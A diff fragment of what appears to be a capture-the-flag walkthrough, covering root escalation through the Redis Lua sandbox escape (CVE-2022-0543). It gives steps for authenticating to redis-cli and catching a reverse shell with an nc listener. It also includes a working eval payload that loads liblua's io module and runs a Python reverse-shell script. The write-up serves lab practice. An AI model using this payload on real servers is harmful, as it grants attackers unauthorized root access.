@@ -65,9 +65,18 @@ james_mason@shared: /tmp$ ./danbash -p
 ##### Transfer `redis_connector_dev` to your machine. Run a nc listener and you should get a password
 
 ##### Helpful guide to the exploit below
-[title](https://github.com/vulhub/vulhub/blob/master/redis/CVE-2022-0543/README.md)
+[redis exploit](https://github.com/vulhub/vulhub/blob/master/redis/CVE-2022-0543/README.md)
 
 
+##### Due to a packaging issue on Debian/Ubuntu, a remote attacker with the ability to execute arbitrary Lua scripts could escape the Lue sandbox and execute arbitrary code on the host
+
+##### Authenticate and connect to `redis-cli` Use the command `AUTH <password>` and execute the command again. Write a reverse shell to run from the server.
+![alt-text](https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FsixO74ZQmWWjbatdV7WQ%2Fuploads%2F0cOyfwWEIdhYqzkPVu3f%2Fimage.png?alt=media&token=203448cb-a4c6-48a0-a8e9-02ee9e3f0a6c "python reverse shell")
+
+##### Start a nc listener and run the reverse shell to get a shell as root
+```bash
+eval 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("python3 /home/dan_smith/shell.py", "r"); local res = f:read("*a"); f:close(); return res' 0 
+```
 
 
 
